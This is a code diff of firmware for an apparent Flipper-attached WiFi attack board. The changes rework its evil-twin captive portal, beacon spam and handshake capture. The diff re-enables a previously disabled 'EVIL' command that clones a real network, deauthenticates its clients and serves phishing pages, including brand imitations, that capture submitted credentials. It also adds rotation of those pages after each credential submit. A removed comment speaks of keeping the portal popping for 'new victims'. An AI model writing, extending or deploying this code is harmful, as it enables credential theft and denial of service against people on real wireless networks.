@@ -55,6 +55,8 @@ enum portals{
 #include "wids.h"
 // M4: raw-lwIP TCP HTTP listener for the WebUI (the Arduino WiFiServer accept is broken on the AP).
 #include "web_lwip.h"
+// Deferred log for the lwIP/tcpip thread (DHCP/DNS must not write the UART directly).
+#include "lwip_log.h"
 
 // Stop the SDK's built-in DHCP server (in lib_arduino.a) so our option-114 server
 // can own UDP:67. Declared here to avoid pulling the whole dhcps.h.
@@ -140,6 +142,7 @@ void build_portal_urls(const char* ssid){
   snprintf(portalHost, sizeof(portalHost), "%s.com", s);
   snprintf(portalUrl,  sizeof(portalUrl),  "http://%s/", portalHost);
   snprintf(cpUri,      sizeof(cpUri),      "http://%s/cp.json", portalHost);
+  web_lwip_set_urls(portalUrl, cpUri);   // 302 Location + cp.json body must match DHCP option 114
   Serial.print("PORTAL host: "); Serial.println(portalHost);
 }
 //int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
@@ -174,22 +177,15 @@ String generateRandomString(int len){
   }
   return randstr;
 }
-
-String parseRequest(String request) {
-  int path_start = request.indexOf(' ') + 1;
-  int path_end = request.indexOf(' ', path_start);
-  return request.substring(path_start, path_end);
-}
-
 //DNS
 bool apActive = false;
 
 // Custom portal: HTML streamed from the Flipper (SD file) via PORTALHTML hex chunks.
-static char customPortal[8192];
+static char customPortal[6144];   // BD_RAM_NS is the binding constraint; FAP caps uploads to match
 static volatile uint16_t customPortalLen = 0;
 
 
-int status = WL_IDLE_STATUS;   
+int status = WL_IDLE_STATUS;
 
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
@@ -205,28 +201,28 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
     if(result.ssid.length()==0)result.ssid = String("<empty>");
     result.channel = record->channel;
     result.rssi = record->signal_strength;
-    
+
     memcpy(&result.bssid, &record->BSSID, 6);
     // (no bssid_str here: it pointed at a local -> dangling. The LIST output formats the
     //  MAC itself with %02X, so the pointer was never needed.)
     result.security = record->security;
-    scan_results.push_back(result);
+    // DP_SCAN_AP carries the index in a u8, so the list is capped at 255 entries.
+    if (scan_results.size() < 255) scan_results.push_back(result);
   }
   return RTW_SUCCESS;
 }
-WiFiServer server(80);
-bool serveBegined =false;
 
-// M4: board WebUI. When set, the SoftAP's HTTP server serves a READ-ONLY status page (live in-RAM
-// state) at every path instead of a captive portal. webui_render is defined later (after the WIDS/
-// harvest/evil-twin globals it reads), so it is forward-declared here for handleRequest.
+
+// M4: board WebUI. When set, the SoftAP's raw-lwIP listener serves a READ-ONLY status page (live
+// in-RAM state) at every path instead of a captive portal. webui_render is defined later (after the
+// WIDS/harvest/evil-twin globals it reads), so it is forward-declared here.
 static volatile bool webui_mode = false;
-// Evil-twin captive portal served via the raw-lwIP listener (web_lwip) instead of the Arduino
-// WiFiServer. Set while the clone AP is up; gates off the old apActive server.available() loop.
+// Evil-twin / Create AP captive portal served via the raw-lwIP listener (web_lwip). Set while the
+// AP is up; AT_HTTP picks the portal listener over the WebUI one.
 static volatile bool web_portal_mode = false;
 static void webui_render(char* b, size_t n);
 
-// M4: RGB LED gate. While led_quiet (night mode — set by "LED OFF", cleared by "LED ON"/"LED r g b"),
+// M4: RGB LED gate. While led_quiet (night mode - set by "LED OFF", cleared by "LED ON"/"LED r g b"),
 // every LED write forces the LED OFF, so status blinks (channel hop, AP activity, ...) stay dark too.
 // All status code writes LEDs through led_w(); the manual LED command sets/clears led_quiet.
 static volatile bool led_quiet = false;
@@ -234,152 +230,18 @@ static inline void led_w(uint8_t pin, int val) {
   digitalWrite(pin, led_quiet ? LOW : (val ? HIGH : LOW));
 }
 
-
-// D.4/2 (architect): the legacy AP functions are DISABLED in this isolated test build. The
-// cooperative test lifecycle they are replaced by lives right before loop(), where every feature
-// global it must respect is in scope. Callers keep compiling against these declarations.
-void createAP(char *, char *, char *);
-void createAP(char *, char *);
+// D.4/2 (architect): the legacy AP entry points forward into the cooperative lifecycle. The
+// lifecycle itself lives right before loop(), where every feature global it must respect is in
+// scope. Callers keep compiling against these declarations.
+bool createAP(char *, char *, char *);
+bool createAP(char *, char *);
 void destroyAP();
 
-String makeResponse(int code, String content_type, bool compresed, size_t content_length) {
-  // Well-formed HTTP is required: Android/iOS captive detection ignores malformed
-  // responses (bare LF, no Content-Length). CRLF + Content-Length mirrors stock 5Ghost.
-  const char *reason = (code == 302) ? "Found" : (code == 404) ? "Not Found" : "OK";
-  String response = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
-  if(compresed)
-  response += "Content-Encoding: gzip\r\n";
-  response += "Content-Type: " + content_type + "\r\n";
-  response += "Content-Length: " + String(content_length) + "\r\n";
-  response += "Cache-Control: no-store\r\n";
-  response += "Connection: close\r\n\r\n";
-  return response;
-}
-
-// 302 to the portal root — this is what makes Android's generate_204 / iOS probes fire the
-// "Sign in to network" flow. Stock 5Ghost uses exactly this; DHCP option 114 is NOT needed.
-void handleRedirect(WiFiClient &client) {
-  String response = "HTTP/1.1 302 Found\r\n";
-  response += "Location: " + String(portalUrl) + "\r\n";
-  response += "Content-Length: 0\r\n";
-  response += "Cache-Control: no-store\r\n";
-  response += "Connection: close\r\n\r\n";
-  client.write(response.c_str());
-}
-
-// Per-client captive state: once a client submits the portal form it's "authorized",
-// and we answer ITS OS connectivity probes with 204 (No Content) so the
-// "Connected, no internet" warning clears. Un-authorized clients still get a 302 to
-// the portal, so it keeps popping for new victims. Peer IP via WiFiClient::remoteIP()
-// (core patch -> lwip_getpeername).
-static uint32_t authed_ips[16];
-static uint8_t authed_n = 0;
-bool ip_is_authed(uint32_t ip) { for (uint8_t i = 0; i < authed_n; i++) if (authed_ips[i] == ip) return true; return false; }
-void ip_mark_authed(uint32_t ip) { if (ip && !ip_is_authed(ip)) { authed_ips[authed_n % 16] = ip; if (authed_n < 16) authed_n++; } }
-
-void handle204(WiFiClient &client) {
-  // 204 = probe succeeded -> OS marks the network validated and drops the warning.
-  client.write("HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n");
-}
-
-void handle404(WiFiClient &client) {
-  String body = "Not found!";
-  String response = makeResponse(404, "text/plain", false, body.length());
-  response += body;
-  client.write(response.c_str());
-}
-
-
-void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
-  // M4: WebUI mode serves a read-only status page at every path (no captive portal / phishing).
-  if(webui_mode){
-    char wb[800];   // stack, not static: BD_RAM_NS headroom is ~256B (page is <800B)
-    webui_render(wb, sizeof(wb));
-    size_t wl = strlen(wb);
-    String resp = makeResponse(200, "text/html", false, wl);
-    client.write(resp.c_str());
-    if(client.connected()) client.write((const uint8_t*)wb, wl);
-    delay(10);
-    while(client.available()){ client.read(); delay(1); }
-    return;
-  }
-  const char *webPage;
-  size_t len;
-  bool compresed = false;
-  switch(portalType){
-    case Default:
-      webPage = default_web(ssid);
-      len = strlen(webPage);
-      break;
-#ifdef PETREL_BRAND_PORTALS   // real-brand pages: private overlay only; else these fall to Default
-    case Facebook:
-      webPage = (const char*)facebook;
-      len = facebook_len;
-      break;
-    case Amazon:
-      webPage = (const char*)amazon;
-      len = amazon_len;
-      break;
-    case Apple:
-      webPage = (const char *)apple;
-      len = apple_len;
-      break;
-    case Google:
-      webPage = (const char *)google;
-      len = google_len;
-      break;
-    case Microsoft:
-      webPage = (const char *)microsoft;
-      len = microsoft_len;
-      break;
-#endif
-    case Custom:
-      webPage = customPortal;
-      len = customPortalLen;
-      break;
-    default:
-      webPage = default_web(ssid);
-  }
-  Serial.print("Heap libre header:");
-  Serial.println(xPortGetFreeHeapSize());
-  if(webPage[0]==0x1f && webPage[1]==0x8b){
-    compresed=true;
-  }
-  
-  String response = makeResponse(200, "text/html", compresed, len);
-  client.write(response.c_str());
-  
-   
-
-  size_t chunkSize = 5000;
-
-  for (size_t i = 0; i < len; i += chunkSize) {
-        size_t sendSize = MIN(chunkSize, len - i);
-        while(client.available()){
-            client.read();
-            delay(10);
-            }
-            Serial.print("Heap libre write:");
-        Serial.println(xPortGetFreeHeapSize());
-        if(client.connected()){
-          client.write((const uint8_t *)(webPage + i), sendSize);
-          if(client.getWriteError())return;
-        }else{
-          return;
-        }
-        delay(1);
-  }
-
-  delay(10);
-   while(client.available()){
-            client.read();
-            delay(1);
-            }
-}
 
 int scanNetworks(int miliseconds) {
   DEBUG_SER_PRINT("Scanning WiFi networks ("+(String)miliseconds+" ms)...\n");
   scan_results.clear();
+  if (scan_results.capacity() < 64) scan_results.reserve(64);   // avoid realloc per push_back
   scan_done = false;
   DEBUG_SER_PRINT("wifi get band type:"+(String)wifi_get_band_type()+"\n");
   DEBUG_SER_PRINT("scan results cleared...");
@@ -555,8 +417,10 @@ static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdat
       // the driver/WiFi task, so no String/heap work here.
       if (hs_cap && hs_count < HS_MAX) {
         // Target binding: a pinned grab stores ONLY the selected AP's EAPOL. BSSID = addr1 when
-        // ToDS (STA->AP), addr2 when FromDS (AP->STA). No target set -> keep everything (CAPTURE).
-        const uint8_t* fb = (buf[1] & 0x01) ? buf + 4 : buf + 10;
+        // ToDS (STA->AP), addr2 when FromDS (AP->STA), addr3 in an IBSS (neither bit set, where
+        // addr3 IS the BSSID). No target set -> keep everything (CAPTURE).
+        uint8_t ds = buf[1] & 0x03;
+        const uint8_t* fb = (ds == 0x01) ? buf + 4 : (ds == 0x02) ? buf + 10 : buf + 16;
         if (!hsg_target_set || memcmp(fb, hsg_bssid, 6) == 0) {
           uint16_t n = (len < HS_FRAME_MAX) ? (uint16_t)len : (uint16_t)HS_FRAME_MAX;
           memcpy(hs_frames[hs_count], buf, n);
@@ -935,7 +799,10 @@ static void tx_probe_req(const uint8_t* src, const char* ssid) {
 // whole beacon-spam family (custom/random/rickroll/ghost/AP-clone) was dead. This avoids that
 // code path entirely. The raw TX buffer only has 0x68-0x28 = 64 usable bytes, so the SSID is
 // capped to keep the frame inside it.
-#define TX_RAW_MAX_PAYLOAD 64
+// Frame-body cap for the raw TX staging buffer (tx_stage). It used to be 64 while the buffer was
+// 128, so a 24-char SSID pushed the rates IE and the DS Parameter Set past the cap and the beacon
+// stopped advertising its channel. Keep it equal to the buffer.
+#define TX_RAW_MAX_PAYLOAD 128
 static const uint8_t TX_BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 static int build_beacon_frame(uint8_t* f, const uint8_t* src, const uint8_t* dst,
@@ -950,9 +817,8 @@ static int build_beacon_frame(uint8_t* f, const uint8_t* src, const uint8_t* dst
   for(int i = 0; i < 8; i++) f[n++] = 0x00;     // timestamp
   f[n++] = 0x64; f[n++] = 0x00;                 // beacon interval
   f[n++] = 0x21; f[n++] = 0x00;                 // capability (ESS)
-  // The raw TX staging buffer is only TX_RAW_MAX_PAYLOAD bytes, so the SSID is what has to
-  // survive intact; the optional IEs are appended only while they still fit. The DS Parameter
-  // Set (our channel) is what makes the SSID appear in a normal scan list.
+  // The optional IEs are appended only while they still fit, but the SSID is what has to survive
+  // intact. The DS Parameter Set (our channel) is what makes the SSID appear in a normal scan list.
   int sl = ssid ? (int)strlen(ssid) : 0;
   if(sl > TX_RAW_MAX_PAYLOAD - 40) sl = TX_RAW_MAX_PAYLOAD - 40;
   f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID IE
@@ -1423,9 +1289,11 @@ static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
 // Measured after moving the tune inside the loop: 64 beacons on channel 36 complete and the board
 // stays up, so 5 GHz raw TX works and 5 GHz targets are allowed.
 static bool tx_raw_chan_ok(int ch, const char* who) {
-  if(ch >= 1 && ch <= 165 && !is_dfs_channel(ch)) return true;
+  // Valid TX channels are 1-14 (2.4 GHz) and the non-DFS 5 GHz sets 36-48 / 149-165. The old
+  // "1..165 minus DFS" also accepted 15-35, which are not real channels.
+  if((ch >= 1 && ch <= 14) || (ch >= 36 && ch <= 48) || (ch >= 149 && ch <= 165)) return true;
   String r = String("ERROR: ") + who + " refused: channel " + String(ch) +
-             (is_dfs_channel(ch) ? " is DFS (radar, RX only)" : " is out of range 1-165");
+             (is_dfs_channel(ch) ? " is DFS (radar, RX only)" : " is not 1-14 / 36-48 / 149-165");
   Serial.println(r); Serial1.println(r);
   return false;
 }
@@ -1674,6 +1542,7 @@ static void hv_stop(const char* why) {
         wifi_set_promisc(0, NULL, 0);
         hs_cap = false;
         hsg_phase = HSG_IDLE;
+        hsg_target_set = false;
     }
     char m[48];
     snprintf(m, sizeof(m), "HARVEST:stopped %s", why ? why : "");
@@ -1805,13 +1674,12 @@ static uint8_t atChannel = 6;
 static uint32_t atCycle = 0;
 static uint32_t atSince = 0;
 static uint32_t atPoll = 0;
-static uint32_t atAccept = 0;
 static bool atWantStart = false;
 static bool atStopRequested = false;
 static bool atClean = true;
 static uint8_t atFailure = 0;
+static uint8_t atOffTries = 0;   // consecutive RADIO_OP_OFF submission failures (retry cap)
 static rtw_mode_t atRadioTarget = RTW_MODE_STA_AP;
-static WiFiClient atClient;
 
 // ---- D.4/2 serialized radio worker (architect ruling, option A) ----
 // Contract: ONE outstanding job (immutable once submitted); the completion record crosses a
@@ -1977,25 +1845,29 @@ static char     et_ssid[33] = {0};
 static volatile int et_ch = 6;
 static volatile uint32_t et_t = 0;
 
-static void atStart(int ch = 6, const char* apssid = nullptr, bool portal = false)
+static bool atStart(int ch = 6, const char* apssid = nullptr, bool portal = false)
 {
     if (atState != AT_IDLE &&
         !(atState == AT_FAILED && atClean)) {
         atReply("APTEST:BUSY");
-        return;
+        return false;
     }
 
     /*
      * This deliberately isolated test build refuses to run while ANY other
      * feature is active: the lifecycle must own the radio alone.
+     *
+     * EXCEPTION: a non-empty deauth_wifis list is TX-only and stays on the AP's own channel, so it
+     * coexists with the AP (that is exactly the EVIL flow: deauth the real AP, host its clone).
+     * dauth_run (DEAUTHRUN) is excluded because it retunes the channel round-robin.
      */
     if (hopping || cap_active || hsg_phase != HSG_IDLE || hv_phase != HV_IDLE || wids_on ||
         et_phase != ET_IDLE ||
-        dauth_run || !deauth_wifis.empty() ||
+        dauth_run ||
         karma_on || randomSSID || rickroll || ghostSpam ||
         ssid.length() != 0) {
         atReply("APTEST:BUSY");
-        return;
+        return false;
     }
 
     /*
@@ -2015,20 +1887,22 @@ static void atStart(int ch = 6, const char* apssid = nullptr, bool portal = fals
     else
         atChannel = 6;
     // Create AP serves the selected captive portal via the raw-lwIP listener; the bare test AP serves
-    // the read-only status page via the raw-lwIP WebUI. Either way NO Arduino server.begin() runs, so
+    // the read-only status page via the raw-lwIP WebUI. The Arduino WiFiServer is not used at all, so
     // the "[ERROR] Accept connection failed" flood is gone. Set per start; the next start overwrites
     // these, so NO stop-side clear is needed (clearing them in atStop would break eviltwin's per-cycle
-    // AP re-arm -> server.begin fallback).
+    // AP re-arm).
     web_portal_mode = portal;
     webui_mode = !portal;
     ++atCycle;
     atFailure = 0;
+    atOffTries = 0;
     atWantStart = true;
     atStopRequested = false;
     atEnter(AT_CLOSE);
     char m[64]; snprintf(m, sizeof(m), "APTEST:ACCEPTED ssid=%s ch=%d%s",
                          atSsid, atChannel, portal ? " portal" : "");
     atReply(m);
+    return true;
 }
 
 static void atStop()
@@ -2084,6 +1958,7 @@ static bool atStartClone(const char* ssid, int ch) {
                           // checks webui_mode first, so a stale true from a prior APTEST/WEBUI would win)
     ++atCycle;
     atFailure = 0;
+    atOffTries = 0;
     atWantStart = true;
     atStopRequested = false;
     atEnter(AT_CLOSE);
@@ -2128,10 +2003,10 @@ static void webui_render(char* b, size_t n) {
       et_phase, et_live ? "LIVE" : "DRY");
 }
 
-// Resolve the portal selected via the `portal` global (set by host PORTAL <n> / PORTALHTML),
-// mirroring handleRequest()'s switch, into bytes for the raw-lwIP captive-portal listener. Brand
-// pages are gzip blobs in flash (streamed zero-copy); Custom is the mutable customPortal buffer
-// (streamed with COPY); Default is built from the clone SSID. gzip is detected from the magic.
+// Resolve the portal selected via the `portal` global (set by host PORTAL <n> / PORTALHTML), into
+// bytes for the raw-lwIP captive-portal listener. Brand pages are gzip blobs in flash (streamed
+// zero-copy); Custom is the mutable customPortal buffer (streamed with COPY); Default is built from
+// the clone SSID. gzip is detected from the magic.
 static void resolve_eviltwin_portal(const char** body, int* len, bool* gzip, bool* copy) {
   const char* b; int l; bool cp = false;
   switch ((enum portals)portal) {
@@ -2144,10 +2019,22 @@ static void resolve_eviltwin_portal(const char** body, int* len, bool* gzip, boo
 #endif
     case Custom:    b = customPortal; l = customPortalLen; cp = true; break;   // mutable -> COPY
     case Default:
-    default:        b = default_web(String(atSsid)); l = (int)strlen(b); break;   // current AP ssid (eviltwin or Create AP)
+    default:        // current AP ssid. default_web() returns a static String's buffer; it is
+                    // streamed with COPY so a rebuild cannot free it under an in-flight send.
+                    b = default_web(String(atSsid)); l = (int)strlen(b); cp = true; break;
   }
   *body = b; *len = l; *copy = cp;
   *gzip = (l >= 2 && (uint8_t)b[0] == 0x1f && (uint8_t)b[1] == 0x8b);
+}
+
+// Portal rotation (PORTALROT 1): advance to the next page after every credential submit. Runs in the
+// tcpip thread, so it only rewrites the stable Default buffer and swaps the served pointer.
+static void portal_rotate_now(void) {
+  if (!portal_rot) return;
+  portal = (portal + 1) % 6;   // 0..5: Custom (6) is the operator's own page, never rotated away
+  const char* b; int l; bool g, c;
+  resolve_eviltwin_portal(&b, &l, &g, &c);
+  web_lwip_set_portal(b, l, g, c);
 }
 
 static void apTestTick()
@@ -2174,14 +2061,11 @@ static void apTestTick()
 
     case AT_CLOSE:
         apActive = false;
-        atClient.stop();
-        server.stop();
         web_lwip_stop();   // M4: free the raw-lwIP WebUI/portal listener on teardown
         // NOTE: do NOT clear web_portal_mode here. AT_CLOSE runs mid-bringup too (atStartClone ->
         // AT_CLOSE -> AP_BEGIN -> ... -> AT_HTTP), and the eviltwin FSM cycles the AP up/down, so
-        // clearing it here would drop portal mode before AT_HTTP and fall back to server.begin().
-        // It is cleared only when eviltwin fully stops (releaseRadio).
-        serveBegined = false;
+        // clearing it here would drop portal mode before AT_HTTP. It is cleared only when eviltwin
+        // fully stops (releaseRadio).
         stop_DHCP_Server();
         unbind_dns();
         dhcps_deinit();
@@ -2197,8 +2081,12 @@ static void apTestTick()
     case AT_OFF_BEGIN: {
         const uint32_t began = millis();
         if (!radioSubmit(RADIO_OP_OFF, RTW_MODE_NONE)) {
-            atFail(1);   // no worker exists, so the radio was never touched: cleanup is safe
+            // No worker exists, so the radio was never touched: cleanup is safe and retryable. But
+            // retrying forever never reached FAILED and never told the host, so cap it.
+            if (++atOffTries >= 3) { atTerminalFailure(1); return; }
+            atFail(1);
         } else {
+            atOffTries = 0;
             atEnter(AT_OFF_POLL);
             atSince = began;   // deadline includes submission time
         }
@@ -2320,27 +2208,18 @@ static void apTestTick()
         return;
 
     case AT_HTTP:
-        // M4: WebUI serves over a raw-lwIP TCP listener (the Arduino WiFiServer never receives the
-        // AP's connections). Start it INSTEAD of server.begin() so nothing else binds :80.
+        // M4: the page is served over a raw-lwIP TCP listener (the Arduino WiFiServer never receives
+        // the AP's connections), so nothing else binds :80.
         if (webui_mode) {
             if (!web_lwip_start(webui_render)) { atFail(9); return; }
-        } else if (web_portal_mode) {
-            // Evil-twin captive portal: same raw-lwIP listener (Arduino WiFiServer.accept never
-            // receives the AP's connections), serving the SELECTED portal page (Default/brand/Custom
-            // per the `portal` global) + OS-probe redirects, and capturing submitted credentials.
-            // The old apActive server.available() loop is gated off.
+        } else {
+            // Captive portal (Create AP / evil-twin clone): same raw-lwIP listener, serving the
+            // SELECTED portal page (Default/brand/Custom per the `portal` global) + OS-probe
+            // redirects, and capturing submitted credentials.
             const char* pb; int pl; bool pg, pc;
             resolve_eviltwin_portal(&pb, &pl, &pg, &pc);
+            web_lwip_set_rotate(portal_rotate_now);
             if (!web_lwip_start_portal(pb, pl, pg, pc)) { atFail(9); return; }
-        } else {
-            // The pinned core (3.1.7) WiFiServer has no setNonBlockingMode(); _is_blocked defaults to
-            // false, so startServer() already calls set_nonblocking(). Mirrors the legacy begin().
-            server.begin();
-            if (!server.connected()) {
-                atFail(9);
-                return;
-            }
-            serveBegined = true;
         }
         status = WL_CONNECTED;
         apActive = true;             // confirmation AND all services succeeded
@@ -2351,64 +2230,20 @@ static void apTestTick()
     }
 }
 
-/*
- * Single owned client; no portal, request logging, query parsing,
- * credentials, impersonation, or unbounded receive/drain loops.
- */
-static void apTestHttpTick()
+/* Legacy callers (EVIL, DEAUTH) now drive the cooperative lifecycle instead of the old synchronous
+ * createAP(): the AP comes up through atStart() so loop() stays responsive, and the portal is served
+ * by the raw-lwIP listener. `ch` is the target channel as a decimal string. Returns false if the
+ * lifecycle refused (busy). */
+bool createAP(char *ssid, char *ch, char *)
 {
-    if (webui_mode || web_portal_mode) return;   // served by the raw-lwIP listener; no Arduino server
-                                                  // (both WebUI and the evil-twin portal use web_lwip)
-    static uint32_t clientSince = 0;
-    static bool have = false;   // hold an accepted client by an explicit flag: connected() can read
-                                // false right after accept, and the old code stopped the client then,
-                                // closing it before the request arrived (curl saw an empty reply).
-
-    if (atState != AT_READY) { if (have) { atClient.stop(); have = false; } return; }
-
-    if (!have) {
-        if ((uint32_t)(millis() - atAccept) < 60) return;   // rate-limit idle accept polls
-        atAccept = millis();
-        atClient = server.available();
-        if (atClient.connected() || atClient.available() > 0) {  // a real client (not a failed accept)
-            have = true; clientSince = millis();
-        } else {
-            atClient.stop();
-        }
-        return;
-    }
-
-    // hold the client and answer its request (WebUI status page, or the test-AP marker)
-    if (atClient.available() > 0) {
-        if (webui_mode) {
-            char wb[800];
-            webui_render(wb, sizeof(wb));
-            size_t wl = strlen(wb);
-            String resp = makeResponse(200, "text/html", false, wl);
-            atClient.write((const uint8_t *)resp.c_str(), resp.length());
-            atClient.write((const uint8_t *)wb, wl);
-            Serial.println("HTTPTICK:served webui");
-        } else {
-            static const char response[] =
-                "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n"
-                "Content-Length: 11\r\nConnection: close\r\n\r\nPETRELTESTAP\n";
-            atClient.write((const uint8_t *)response, sizeof(response) - 1);
-        }
-        atClient.stop(); have = false;
-    } else if ((uint32_t)(millis() - clientSince) >= 1500) {
-        atClient.stop(); have = false;   // no request line within 1.5 s
-    }
+    build_portal_urls(ssid);
+    webui_mode = false;
+    return atStart(atoi(ch), ssid, /*portal=*/true);
 }
 
-/* Containment: existing callers cannot reactivate legacy AP/portal flows. */
-void createAP(char *, char *, char *)
+bool createAP(char *ssid, char *ch)
 {
-    atReply("ERROR:Legacy AP disabled; use APTEST START");
-}
-
-void createAP(char *, char *)
-{
-    atReply("ERROR:Legacy AP disabled; use APTEST START");
+    return createAP(ssid, ch, nullptr);
 }
 
 void destroyAP()
@@ -2423,6 +2258,10 @@ void loop() {
     char ev[128];
     if (web_lwip_poll_creds(ev, sizeof(ev))) { Serial.print("EV:"); Serial.println(ev);
                                                Serial1.print("EV:"); Serial1.println(ev); }
+  }
+  {   // drain the lwIP-thread log (DHCP/DNS): the tcpip thread must not write the UART itself
+    char ll[96];
+    while (lwip_log_poll(ll, sizeof(ll))) { Serial.println(ll); Serial1.println(ll); }
   }
   // Drain each UART fast (no per-char delay) so long chunked lines aren't dropped, into its OWN
   // buffer.
@@ -2447,7 +2286,6 @@ void loop() {
       // re-copy the shrinking suffix once per line.
       readString = buf.substring(0, nl + 1);   // one line, trailing '\n' included
       buf.remove(0, nl + 1);
-      rec_note(readString);   // F5: capture actions for macro recording (filtered inside)
     {
         // D.4/2 command gate (architect): the lifecycle owns the radio while it runs.
         String command = readString;
@@ -2513,17 +2351,22 @@ void loop() {
          * Exclusive radio ownership. Prevent SCAN, STOP, CHANNEL and
          * other legacy commands from modifying a transition in progress.
          */
-        if (atOwned() && command != "PING" &&
+        if (atOwned() && command != "PING" && !command.startsWith("STOP") &&
             !command.startsWith("EVIL") && !command.startsWith("WEBUI")) {   // WEBUI STOP must pass
             atReply("ERROR:APTEST owns radio");
             readString = "";
             continue;
         }
+
+        // F5: record only commands that survived the gate, so a rejected command is not replayed
+        // from the macro (rec_note filters the recorder's own commands internally).
+        rec_note(readString);
     }
     if(readString.substring(0,4)=="SCAN"){
       if(apActive)
         destroyAP();
       deauth_wifis.clear();
+      current_num = 0;
       DEBUG_SER_PRINT("Stop randomSSID\n");
       randomSSID = false;
       rickroll=false;
@@ -2555,15 +2398,20 @@ void loop() {
       dauth_n = 0;
       if(cap_active){ wifi_set_promisc(0, NULL, 0); hs_cap = false; cap_active = false; }
       hsg_phase = HSG_IDLE;  // abort any in-flight HSGRAB/PKGRAB
+      hsg_target_set = false;
       ghostSpam = false;
       secured = false;
       strcpy(wpa_pass,"");
-      if(readString.length()>5 && !apActive){
+      // "STOP <n>" removes one target and leaves the AP running (that is the info screen's toggle);
+      // a bare "STOP", or an out-of-range index, tears everything down. The old code only honoured
+      // the per-target form while no AP was up, so the toggle was dead once the clone was running.
+      bool perTarget = (readString.length() > 5);
+      if(perTarget){
         unsigned int numStation = readString.substring(5,readString.length()-1).toInt();
         if(numStation < scan_results.size()){
           wifis_temp.clear();
           unsigned int num_st_tmp;
-          
+
           for(unsigned int i=0; i<deauth_wifis.size(); i++){
             num_st_tmp=deauth_wifis[i];
             if(num_st_tmp != numStation){
@@ -2575,10 +2423,15 @@ void loop() {
             num_st_tmp=wifis_temp[i];
             deauth_wifis.push_back(num_st_tmp);
           }
+          current_num = 0;   // the list changed under the round-robin cursor
+        }else{
+          perTarget = false;
         }
-      }else{
+      }
+      if(!perTarget){
         destroyAP();
         deauth_wifis.clear();
+        current_num = 0;
         DEBUG_SER_PRINT("Stop randomSSID\n");
         randomSSID = false;
         rickroll=false;
@@ -2596,11 +2449,10 @@ void loop() {
       DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
        
     }else if(readString.substring(0,7)=="APSTART"){
-      // Create AP: bring up an OPEN AP + the selected captive portal via the cooperative FSM. The
-      // legacy createAP() is disabled and the Arduino server.begin() accept never fires on the AP, so
-      // route through atStart(..., portal=true): petrel_ap_begin supports 2.4 AND non-DFS 5 GHz, and
-      // AT_HTTP serves the portal via web_lwip_start_portal (resolved from the `portal` global that
-      // the host set with PORTAL <n>). Channel comes from the preceding CHANNEL command.
+      // Create AP: bring up an OPEN AP + the selected captive portal via the cooperative FSM.
+      // atStart(..., portal=true) keeps loop() responsive: petrel_ap_begin supports 2.4 AND non-DFS
+      // 5 GHz, and AT_HTTP serves the portal via web_lwip_start_portal (resolved from the `portal`
+      // global that the host set with PORTAL <n>). Channel comes from the preceding CHANNEL command.
       char apssid[33];
       String ap_ssid = readString.substring(8); ap_ssid.trim();
       ap_ssid.toCharArray(apssid, 33);
@@ -2775,6 +2627,8 @@ void loop() {
       // C: clear the list WITHOUT the WiFi teardown that STOP does.
       dauth_run = false;
       dauth_n = 0;
+      deauth_wifis.clear();
+      current_num = 0;
       Serial.println("DEAUTHCLEAR:ok"); Serial1.println("DEAUTHCLEAR:ok");
     }else if(readString.substring(0,8)=="EVILTWIN"){   // checked before "EVIL" (substring 0,4)
       // M3: evil-twin FSM.  EVILTWIN START <bssid-12hex> <ssid> <ch> [LIVE] | STOP | STATUS
@@ -2795,6 +2649,10 @@ void loop() {
           bs[i] = (uint8_t)strtoul(bhex.substring(i*2, i*2+2).c_str(), NULL, 16);
         if(!okb || ess.length() == 0 || ch < 1 || ch > 165){
           Serial1.println("EVILTWIN:usage START <bssid-12hex> <ssid> <ch> [LIVE]");
+        }else if(live && !((ch >= 1 && ch <= 14) || (ch >= 36 && ch <= 48) || (ch >= 149 && ch <= 165))){
+          // LIVE brings up a clone AP, and an AP cannot sit on a DFS channel: refuse now instead of
+          // spending the 4 s deauth burst and then failing in atStartClone.
+          Serial1.println("EVILTWIN:clone channel refused (DFS/out-of-range; use 1-14 or 36-48/149-165)");
         }else if(apActive || cap_active || hopping || hsg_phase != HSG_IDLE || atOwned() ||
                  dauth_run || hv_phase != HV_IDLE || wids_on || sniff_stream || et_phase != ET_IDLE){
           Serial1.println("EVILTWIN:busy");
@@ -2829,43 +2687,33 @@ void loop() {
         Serial1.println("EVILTWIN:usage START <bssid-12hex> <ssid> <ch> [LIVE]|STOP|STATUS");
       }
     }else if(readString.substring(0,4)=="EVIL"){
-      // CONTAINMENT (architect B.1): EVIL called createAP() synchronously from this handler with no
-      // teardown, and the HTTP client loop had no deadline - both can leave loop() unresponsive.
-      // Disabled until the cooperative AP lifecycle lands.
-      Serial.println("ERROR:Evil disabled");
-      Serial1.println("ERROR:Evil disabled");
-    }else if(readString.substring(0,6)=="DEAUTH"){
-      int numStation;
-      if(readString.substring(0,4)=="EVIL"){
-        numStation = readString.substring(5,readString.length()-1).toInt();
+      // EVIL <n>: clone scan result n (its SSID + channel) as an open AP with the selected portal,
+      // and deauth the real AP so its clients reconnect to us. The AP comes up through the
+      // cooperative lifecycle (atStart), so loop() stays responsive; the old synchronous createAP()
+      // is gone. The deauth list keeps running on the AP's own channel.
+      int numStation = readString.substring(5, readString.length()-1).toInt();
+      if(numStation < 0 || numStation >= (int)scan_results.size()){
+        atReply("ERROR:EVIL:badindex");
+      }else if(scan_results[numStation].ssid.length() == 0){
+        atReply("ERROR:EVIL:badssid (rescan)");
       }else{
-        numStation = readString.substring(7,readString.length()-1).toInt();
+        char chbuf[4];
+        itoa(scan_results[numStation].channel, chbuf, 10);
+        if(createAP((char*)scan_results[numStation].ssid.c_str(), chbuf)){
+          deauth_wifis.push_back(numStation);
+          atReply("EVIL:started");
+        }
       }
+    }else if(readString.substring(0,6)=="DEAUTH"){
